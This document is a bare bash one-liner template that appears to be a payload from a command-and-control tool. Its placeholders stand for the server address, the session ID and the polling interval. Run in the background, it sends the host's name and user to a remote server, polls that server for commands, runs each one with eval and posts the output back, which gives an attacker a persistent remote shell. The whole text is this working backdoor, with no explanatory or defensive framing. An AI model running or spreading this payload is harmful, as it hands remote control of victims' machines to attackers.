nohup `s=*SERVERIP*&&i=*SESSIONID*&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/*GETCMD*" -H "*HOAXID*: $i" 2>/dev/null);[ "$c" != None ]&&r=$(eval "$c")&&$([ $r == byee ]&&pkill -P $$||curl -s -k $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r" 2>/dev/null)&&sleep *FREQ*; done;`&